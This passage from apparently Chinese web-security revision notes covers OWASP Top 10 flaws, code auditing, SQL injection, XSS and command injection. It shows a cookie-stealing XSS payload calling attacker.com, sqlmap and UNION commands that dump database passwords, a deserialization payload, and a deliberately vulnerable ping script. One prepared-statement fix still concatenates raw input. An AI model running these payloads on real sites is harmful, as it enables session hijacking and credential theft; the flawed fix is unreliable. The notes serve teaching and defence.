<li><p>不安全的默认配置</p>
</li>
<li><p>不完整的临时配置</p>
</li>
<li><p>开源云存储</p>
</li>
<li><p>错误的HTTP报头配置</p>
</li>
<li><p>包含敏感信息的详细错误配置</p>
</li>
</ul>
<p><strong>示例</strong></p>
<ul>
<li>cms后台安装控制没修改，默认后台密码路径未修改</li>
<li>服务器配置反馈暴露</li>
<li>服务器自带示例等程序未删除</li>
</ul>
<h4 id="防御-5"><a href="#防御-5" class="headerlink" title="防御"></a>防御</h4><p><strong>如何防范：</strong>不仅需要对操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级。</p>
<h3 id="跨站脚本XSS"><a href="#跨站脚本XSS" class="headerlink" title="跨站脚本XSS"></a>跨站脚本XSS</h3><h4 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h4><p><strong>什么是XSS：</strong>当网页中包含不受信任的、未经恰当验证或转义的数据，或使用可以创建HTML或者JavaScript的浏览器API更新现有的网页时，会出现XSS缺陷。</p>
<p><strong>三种类型：</strong>反射型XSS、存储型XSS、基于DOM的XSS</p>
<p><strong>带来的危害：</strong>攻击者能够在受害者的浏览器执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点</p>
<blockquote>
<p><strong>攻击场景(18级考过，建议全文背下来)：</strong></p>
<p>HTML段的构造中使用未经验证或转义的不可信数据：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span>page<span class="token operator">+=</span>”<span class="token operator">&lt;</span>input name<span class="token operator">=</span>’creditcard’ type<span class="token operator">=</span>’<span class="token constant">TEXT</span>’
value<span class="token operator">=</span>’”request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>“<span class="token constant">C</span>”<span class="token punctuation">)</span><span class="token operator">+</span>’”<span class="token operator">&gt;</span>”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>攻击者在浏览器中修改“C”参数为：</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">‘&gt;&lt;script&gt;document.location=’http://www.attacker.com/cgi-bin/cookie.cgi?foo=’+document.cookie&lt;/script&gt;’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>后果（如何利用）：</strong>受害者的会话ID被发送给攻击者，使攻击者能够劫持用户会话</p>
</blockquote>
<p><strong>攻击代码：</strong><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 提前闭合。</p>
<p><strong>防   范：</strong><code>htmlspecialchars()</code> 把预定义的字符转换为HTML实体。</p>
<p><strong>其他可弹窗代码：</strong><code>onclick</code>、<code>oninput</code>、<code>onmouseover</code></p>
<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul>
<li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
<li>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</li>
<li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
<li>在 style 属性和标签中，包含类似 <code>background-image:url("javascript:...");</code> 的代码（新版本浏览器已经可以防范）。</li>
<li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
</ul>
<h4 id="防御-6"><a href="#防御-6" class="headerlink" title="防御"></a>防御</h4><ol>
<li>不要在页面中插入任何不可信数据，除非这些数已经据根据后面几个原则进行了编码</li>
<li>在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</li>
<li>在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</li>
<li>在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</li>
<li>在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</li>
<li>在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</li>
<li>使用富文本时，使用XSS规则引擎进行编码过滤</li>
<li>防御DOM Based XSS</li>
<li>HttpOnly Cookie</li>
<li>输入检查</li>
</ol>
<h3 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h3><h4 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h4><blockquote>
<p><strong>序列化</strong>：把对象转换为字节序列的过程，即把对象转换为可以存储或传输的数据的过程。例如将内存中的对象转换为二进制数据流或文件，在网络传输过程中，可以是字节或是XML等格式。</p>
<p><strong>反序列化</strong>：把字节序列恢复为对象的过程，即把可以存储或传输的数据转换为对象的过程。例如将二进制数据流或文件加载到内存中还原为对象。</p>
</blockquote>
<p><strong>反序列化攻击：</strong>在身份验证，文件读写，数据传输等功能处，在未对反序列化接口做访问控制，未对序列化数据做加密和签名，加密密钥使用硬编码，使用不安全的反序列化框架库或函数的情况下，由于序列化数据可被用户控制，攻击者可以精心构造恶意的序列化数据（执行特定代码或命令的数据）传递给应用程序，在应用程序反序列化对象时执行攻击者构造的恶意代码，达到攻击者的目的。</p>
<p><strong>序列化用途</strong></p>
<ul>
<li>远程和进程间通信(RPC/IPC)</li>
<li>连线协议、Web服务、消息代理</li>
<li>缓存/持久性</li>
<li>数据库、缓存服务器、文件系统</li>
<li>HTTP cookie、HTML表单参数、API身份验证令牌</li>
</ul>
<p><strong>不安全的反序列化后果：</strong>导致远程代码执行，攻击者还可以进行重放攻击、注入攻击、特权提升攻击</p>
<h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p><strong>序列化：</strong>将程序中对象的状态信息转换为可存储形式的过程（一般为字符串）。对应函数<code>serialize()</code></p>
<p><strong>反序列化：</strong>将序列化的数据反向重新构建对象的过程。对应函数<code>unserialize()</code></p>
<p><strong>目的：</strong>为了方便PHP对象的传输和存储</p>
<blockquote>
<ol>
<li>序列化只是序列化属性，不序列化方法</li>
<li>unserialize接收的参数如果用户可控，则可以传入构造的字符串，实现攻击</li>
<li>要寻找合适的能被控制的属性，利用本身存在的方法魔术方法（以<code>_</code>开头）</li>
</ol>
</blockquote>
<p><strong>俩种主要类型</strong></p>
<ul>
<li><strong>对象和数据结构攻击</strong>：如果存在可以在反序列化过程中或之后被改变行为的<br>类，则攻击者可以通过改变应用逻辑或者实现远程代码执行攻击</li>
<li><strong>数据篡改攻击</strong>：如访问控制相关的攻击一一使用现有的数据结构，但内容发<br>生变化</li>
</ul>
<p><strong>攻击场景</strong></p>
<ul>
<li>使用PHP序列化保存cookie:包含用户的用户ID、角色、密码哈希和其他状态：<br><code>a:4{i:0;i:132;i:1;s:7:"Mallory";i:2;s:4:"user";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960";}</code></li>
<li>攻击者更改序列化对象以授予自己admin权限：<br><code>a:4{i:0;i:1;i:1;s:5:"Alice";i:2;s:5:"admin";i:3;s:32:"b6a8b3bea87fe0e05022f8f3c88bc960"}</code></li>
</ul>
<p>获取序列化字符串的脚本如下：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">{</span>
<span class="token keyword">var</span> <span class="token variable">$target</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
​
<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
​
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>正常的序列化字符串为;</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php">O:对象名的长度:"对象名":对象属性个数:{s:属性名的长度:"属性名";s:属性值的长度:"属性值";}

O:1:"A":1:{s:6:"target";s:4:"test";}
构造不正常的：
O:1:"A":1:{s:6:"target";s:18:"<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span>";}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<blockquote>
<p><strong>如果要序列化protected类型的属性，需要在变量名前加上<code>%00\*%00</code>。序列化private类型的属性，需要在变量名前加上<code>%00类名%00</code></strong>。</p>
</blockquote>
<h4 id="防御-7"><a href="#防御-7" class="headerlink" title="防御"></a>防御</h4><p><strong>如何防止：</strong></p>
<ul>
<li><p>不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化.</p>
</li>
<li><p>执行完整性检查，数字签名</p>
</li>
<li><p>在创建对象前强制执行严格的类型约束</p>
</li>
<li><p>记录反序列化的列外情况和失败信息</p>
</li>
<li><p>限制或监视来自于容器或服务器传入和传出的反序列化网络链接</p>
</li>
<li><p>当用户进行反序列化时警告用户</p>
</li>
</ul>
<h3 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h3><h4 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h4><p><strong>实例：</strong></p>
<p>（1）使用不了解其应用或API中使用的组件，且不及时跟新</p>
<p>（2）组件拥有和应用程序相同的权限</p>
<p><strong>后果：</strong></p>
<p>（1）造成验证的数据丢失或服务器接管</p>
<p>（2）破坏应用程序防御、造成各种攻击并产生严重影响</p>
<h4 id="防御-8"><a href="#防御-8" class="headerlink" title="防御"></a>防御</h4><ul>
<li>使用新版安全的组件版本，及时更新版本，打补丁</li>
<li>根据风险定期修复漏洞框架和库，升级更换平台</li>
<li>进行安全性测试</li>
<li>对组件进行安全配置，了解其组件版本型号等</li>
</ul>
<h3 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a>不足的日志记录和监控</h3><h4 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h4><p><strong>后果：</strong>无法有效发现漏洞和攻击，使攻击者能进一步攻击系统、保持吃讯息或转向跟多系统，以及篡改、提取或销毁数据。</p>
<p><strong>导致不足日志记录的情况：</strong></p>
<ul>
<li><p>未记录可审计性事件</p>
</li>
<li><p>告警和错误时间未能产生或产生不足的和不清晰的日志信息</p>
</li>
<li><p>日志信息仅在本体存储</p>
</li>
<li>没有实时检测和警告，没有设置合理警告阈值</li>
<li>没有利用日志进行检测和分析</li>
</ul>
<h4 id="防御-9"><a href="#防御-9" class="headerlink" title="防御"></a>防御</h4><ul>
<li>及时记录相关操作日志等可审计性事件</li>
<li>分布存储日志</li>
<li>合理设置警告阈值，及时响应</li>
<li>构建入侵检测系统，利用日志分析预防攻击</li>
<li>记录和警告可疑或者不清楚的日志信息</li>
</ul>
<h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><h3 id="代码审计基础"><a href="#代码审计基础" class="headerlink" title="代码审计基础"></a>代码审计基础</h3><p><strong>源代码审计</strong></p>
<ul>
<li>依据CVE漏洞字库表、OWASP Top10漏洞，以及设备、软件厂商公布的漏洞库结合专业源代码扫描工具对各种程序语言编写的源代码进行安全审计</li>
<li>能够为客户提供包括安全编码规范咨询源代码安全现状测评、定位源代码中存在的安全漏洞、分析漏洞风险、给出修改建议等一系列服务</li>
</ul>
<blockquote>
<p>代码审计：发现渗透测试很难发现甚至不能发现的漏洞</p>
</blockquote>
<p><strong>代码审计与渗透测试对比区别，各自优缺点</strong></p>
<ol>
<li>渗透测试（黑盒）<ul>
<li>威胁：来自外部的入侵</li>
<li>描述：模拟黑客攻击的方式，来评估目标系统的安全性</li>
<li>测试目标：包括但不局限于Web应用系统</li>
<li>测试产出：渗透测试报告并提出修复建议</li>
<li>优点：贴近实际场景，远程渗透</li>
<li>缺点：不全面，修复成本高</li>
</ul>
</li>
<li>代码审计（白盒）<ul>
<li>脆弱性：系统自身、软件等存在的问题</li>
<li>描述：发现程序中存在的不安全编码</li>
<li>测试目标：基于提供的系统代码，发现代码的安全漏洞</li>
<li>测试产出：代码审计报告并提出修复建议</li>
<li>优点：全面审查，贴近系统和架构，修复成本低</li>
<li>缺点：现场审计</li>
</ul>
</li>
</ol>
<p><strong>代码审计的流程</strong></p>
<ol>
<li>工具整体扫描（Seay代码审计，Foritfy SCA），人工确认漏洞，形成工具扫描结果</li>
<li>专家分析，安全编码规范，常规漏洞，业务逻辑漏洞等</li>
<li>最终整理形成代码审计报告</li>
</ol>
<p><img src="https://lcypicgo.oss-cn-beijing.aliyuncs.com/img/202205230923601.png" alt="image-20220523092324229"></p>
<p><strong>代码审计通用方法：</strong></p>
<ol>
<li><p>根据敏感关键字回溯参数传递过程</p>
</li>
<li><p>查找可控变量，正向追踪变量传递过程</p>
</li>
<li><p>查找敏感功能点，通读功能点代码</p>
</li>
<li><p>直接通读全文代码</p>
</li>
</ol>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h4><p><strong>SQL注入</strong>是因为后台SQL语句拼接了用户的输入，而且Web应用程序对用户输入数据的合法性没有判断和过滤，前端传入后端的参数是攻击者可控的，攻击者可以通过构造不同的SQL语句来实现对数据库的任意操作。</p>
<h4 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h4><p>sqlmap</p>
<pre class="line-numbers language-none"><code class="language-none">-u ip -D x -T -C x
-D -dbs
-T -tables
-C -columns

# 查找注入点
python3.7 sqlmap.py -u 'http://127.0.0.1:5000/bad_sql?id=111' --dbms='MySQL' --batch

# 查询有哪些数据库
python3.7 sqlmap.py -u 'http://127.0.0.1:5000/bad_sql?id=111' --dbms='MySQL'  --batch –level 3 –dbs

# 查询qa_tools_db/mysql数据库中有哪些表
python3.7 sqlmap.py -u 'http://127.0.0.1:5000/bad_sql?id=111' --dbms='MySQL' –level 3 -D qa_tools_db –tables
python3.7 sqlmap.py -u 'http://127.0.0.1:5000/bad_sql?id=111' --dbms='MySQL' –level 3 -D mysql –tables

# 查询qa_tools_db数据库中jira_infos表有哪些字段
python3.7 sqlmap.py -u 'http://127.0.0.1:5000/bad_sql?id=111' --dbms='MySQL' –level 3 -D qa_tools_db -T jira_infos –columns
python3.7 sqlmap.py -u 'http://127.0.0.1:5000/bad_sql?id=111' --dbms='MySQL' –level 3 -D mysql -T user –columns

# dump出mysql中user表的账号密码
python3.7 sqlmap.py -u "http://127.0.0.1:5000/bad_sql?id=111" --dbms="MySQL" –level 3 -D mysql -T user –passwords -U root -v 2 --batch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>手动注入</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 简单粗暴</span>
admin' <span class="token operator">or</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment"># </span>

 
<span class="token comment"># 数据库</span>
<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>databse<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment"># 爆表名</span>
?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>’ <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span>–<span class="token operator">+</span>
<span class="token comment">#列名</span>
?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>’ <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span>‘users’–<span class="token operator">+</span>

<span class="token comment">#用户表</span>
?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>’ <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span>’:’<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token keyword">from</span> security<span class="token punctuation">.</span>users <span class="token comment">--+</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="sql注入的防御-1"><a href="#sql注入的防御-1" class="headerlink" title="sql注入的防御"></a>sql注入的防御</h4><ul>
<li><p>对输入数据进行校验</p>
<ul>
<li>对非法数据转化为合法化（空格等转码）</li>
<li>拒绝预知的非法输入（黑名单）</li>
<li>只接受已知的合法输入（白名单）</li>
</ul>
</li>
<li><p>使用ORM或者框架技术</p>
</li>
<li><p>对输入的数据进行编码或数据校验</p>
<ul>
<li><code>is_numeric()</code>判断数据类型</li>
<li>对<code>'</code>进行转义<code>/'</code></li>
</ul>
</li>
<li><p>使用预编译语句</p>
</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$servername</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"username"</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span>
<span class="token variable">$dbname</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"myDB"</span><span class="token punctuation">;</span>
 
<span class="token comment">// 创建连接</span>
<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token variable">$servername</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$dbname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//输入ID，	GET</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
	<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token comment">//$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";</span>
<span class="token comment">//$result=mysql_query($sql);</span>
<span class="token comment">//$row = mysql_fetch_array($result);</span>
<span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-&gt;</span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id= ? LIMIT 0,1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"s"</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$stmt</span><span class="token operator">-&gt;</span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h3><h4 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h4><p><strong>什么是XSS：</strong>当网页中包含不受信任的、未经恰当验证或转义的数据，或使用可以创建HTML或者JavaScript的浏览器API更新现有的网页时，会出现XSS缺陷。</p>
<p><strong>三种类型：</strong>反射型XSS、存储型XSS、基于DOM的XSS</p>
<p><strong>带来的危害：</strong>攻击者能够在受害者的浏览器执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点</p>
<blockquote>
<p><strong>攻击场景(18级考过，建议全文背下来)：</strong></p>
<p>HTML段的构造中使用未经验证或转义的不可信数据：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token keyword type-casting">String</span><span class="token punctuation">)</span>page<span class="token operator">+=</span>”<span class="token operator">&lt;</span>input name<span class="token operator">=</span>’creditcard’ type<span class="token operator">=</span>’<span class="token constant">TEXT</span>’
value<span class="token operator">=</span>’”request<span class="token operator">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span>“<span class="token constant">C</span>”<span class="token punctuation">)</span><span class="token operator">+</span>’”<span class="token operator">&gt;</span>”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>攻击者在浏览器中修改“C”参数为：</p>
<pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">‘&gt;&lt;script&gt;document.location=’http://www.attacker.com/cgi-bin/cookie.cgi?foo=’+document.cookie&lt;/script&gt;’<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><strong>后果（如何利用）：</strong>受害者的会话ID被发送给攻击者，使攻击者能够劫持用户会话</p>
</blockquote>
<p><strong>攻击代码：</strong><code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 提前闭合。</p>
<p><strong>防   范：</strong><code>htmlspecialchars()</code> 把预定义的字符转换为HTML实体。</p>
<p><strong>其他可弹窗代码：</strong><code>onclick</code>、<code>oninput</code>、<code>onmouseover</code></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;html&gt;
&lt;body&gt;
&lt;h1 align=center&gt;欢迎来到level1,输入name&lt;/h1&gt;
&lt;form action=""，method="POST"&gt;
    &lt;input type='text' name="name"&gt;
    &lt;input type='submit' value="submit"&gt;
&lt;\form&gt;
&lt;?php 
ini_set("display_errors", 0);
$str = $_POST["name"];
//echo $_str;
echo "&lt;h2 align=center&gt;欢迎用户".$str."&lt;/h2&gt;";
?&gt;
&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
&lt;?php 
echo "&lt;h3 align=center&gt;payload的长度:".strlen($str)."&lt;/h3&gt;";
?&gt;
&lt;/body&gt;
&lt;/html&gt;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>输入脚本<code>&lt;script&gt;alert("xss")&lt;/sctipt&gt;</code></p>
<h4 id="攻击方式-1"><a href="#攻击方式-1" class="headerlink" title="攻击方式"></a>攻击方式</h4><ul>
<li>在 HTML 中内嵌的文本中，恶意内容以 script 标签形成注入。</li>
<li>在内联的 JavaScript 中，拼接的数据突破了原本的限制（字符串，变量，方法名等）。</li>
<li>在标签属性中，恶意内容包含引号，从而突破属性值的限制，注入其他属性或者标签。</li>
<li>在标签的 href、src 等属性中，包含 <code>javascript:</code> 等可执行代码。</li>
<li>在 onload、onerror、onclick 等事件中，注入不受控制代码。</li>
<li>在 style 属性和标签中，包含类似 <code>background-image:url("javascript:...");</code> 的代码（新版本浏览器已经可以防范）。</li>
<li>在 style 属性和标签中，包含类似 <code>expression(...)</code> 的 CSS 表达式代码（新版本浏览器已经可以防范）。</li>
</ul>
<h4 id="防御-10"><a href="#防御-10" class="headerlink" title="防御"></a>防御</h4><ol>
<li>不要在页面中插入任何不可信数据，除非这些数已经据根据后面几个原则进行了编码</li>
<li>在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</li>
<li>在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</li>
<li>在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</li>
<li>在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</li>
<li>在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</li>
<li>使用富文本时，使用XSS规则引擎进行编码过滤</li>
<li>防御DOM Based XSS</li>
<li>HttpOnly Cookie</li>
<li>输入检查</li>
</ol>
<blockquote>
<ul>
<li>输入<code>htmlentities(string,flags,character-set,double_encode)</code>HTML实体转换函数</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">echo</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<ul>
<li>敏感字符转义</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token keyword">echo</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
</blockquote>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h4><p>命令执行漏洞属于高危漏洞，指攻击者可以随意执行系统命令，它属于代码执行的范畴，不仅存在B/S架构中，也存在于C/S架构中。</p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	<span class="token variable">$target</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ip'</span><span class="token punctuation">]</span>
	<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"ping -c 3 <span class="token interpolation"><span class="token variable">$target</span></span>"</span><span class="token punctuation">;</span>
	<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
	<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>WINDOWS系统支持的管道符：<code>&amp;</code>,<code>&amp;&amp;</code>,<code>|</code>,<code>||</code>：直接执行后面的语句net user,whomi</p>
<h4 id="防御-11"><a href="#防御-11" class="headerlink" title="防御"></a>防御</h4><ul>
<li>黑名单防御(过滤特殊字符)。类似代码如下：</li>
</ul>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'dir'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$substitutions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>
    <span class="token string single-quoted-string">'|'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
